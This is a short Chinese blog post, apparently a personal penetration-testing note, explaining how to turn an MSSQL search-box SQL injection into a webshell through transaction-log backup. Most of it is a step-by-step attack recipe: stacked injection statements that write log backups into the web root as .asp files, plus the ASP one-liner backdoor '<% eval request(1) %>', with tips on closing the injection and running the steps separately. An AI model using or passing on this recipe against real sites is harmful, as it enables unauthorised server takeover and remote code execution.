---
title: 利用mssql log备份得到webshell
date: 2018-03-11 13:20:00
tags: 渗透测试
categories: 渗透测试

---


感谢xz的耐心指导，让我学会了此手法。

开始我发现有个搜索框`sql`注入，然后一般常规的思路就是通过注入得到后台账号密码，最后通过上传漏洞得到`webshell`。但是`xz`却不是这样的，于是我问了他`getshell`的思路，他说是`mssql log`备份得到`webshell`的。

<!--more-->


下面进入正题。

我们现在可以知道搜索框有个注入，那我们就可以利用这个搜索框注入。

注意搜索型注入要闭合

![](https://ws1.sinaimg.cn/large/006Y6f53ly1fp8u0lclfbj30cn03tt8o.jpg)


具体图片我就不贴了，只说个思路。


> ;alter database 数据库名称 set RECOVERY FULL--

> ;create table cmd (a image)--

> ;backup log 数据库名称 to disk = 'd:/web/1.asp' with init

> ;insert into cmd (a) values ('<% eval request(1) %>')--

> ;backup log 数据库名称 to disk = 'd:/web/2.asp'--



一定要分开依次执行上面的`sql`语句，不然会被注释掉




![](https://ws1.sinaimg.cn/large/006Y6f53gy1fp8tkk7i3sj30ee04o0tf.jpg)


`1.asp` 保存数据库

`2.asp`是木马


总结：

- 我在操作过程中犯了很多错误，还是xz耐心指导我完成的。我发现要懂原理才行，要懂sql语句，不然连搜索型要闭合和被注释了都不知道，也不知道还有这种拿webshell的手法思路。懂原理方能更好的前进。

